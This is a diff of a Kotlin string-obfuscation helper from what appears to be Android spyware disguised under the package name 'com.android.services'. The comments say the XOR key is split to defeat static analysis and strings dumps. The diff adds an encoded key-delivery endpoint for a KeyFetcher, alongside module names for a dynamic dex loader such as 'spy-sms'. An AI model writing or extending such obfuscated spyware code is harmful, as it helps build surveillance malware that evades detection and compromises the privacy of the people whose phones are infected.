@@ -5,12 +5,12 @@ package com.android.services
  * XOR-encrypted IntArray. Key di-split 4 bagian supaya tidak terbaca
  * saat static analysis / strings dump.
  *
- * Digunakan oleh RemoteConfig, DexModuleLoader, ConnectorService.
+ * Digunakan oleh RemoteConfig, DexModuleLoader, KeyFetcher, ConnectorService.
  * R8 akan obfuscate nama class & method ini di release build.
  */
 internal object ObfStr {
 
-    // Key sama dengan SecureConfig, displit 4 bagian
+    // Key displit 4 bagian
     private fun k1() = byteArrayOf(0x4B, 0x7A, 0x39)   // "Kz9"
     private fun k2() = byteArrayOf(0x21, 0x6D, 0x56)   // "!mV"
     private fun k3() = byteArrayOf(0x23, 0x72, 0x58)   // "#rX"
@@ -32,6 +32,10 @@ internal object ObfStr {
         4, 56, 12, 19, 54, 19, 64, 75, 34, 30, 20, 66, 2, 56, 69, 27,
         63, 89, 88, 87, 36, 20
     ))
+
+    // ── KeyFetcher — key delivery endpoint ───────────────────────────────────
+    // "/api/tk"  (endpoint challenge-response untuk CDC key)
+    fun apiKeyEndpoint() = d(intArrayOf(100, 27, 73, 72, 66, 34, 72))
 
     // ── DexModuleLoader — module names ────────────────────────────────────────
     // "spy-sms"
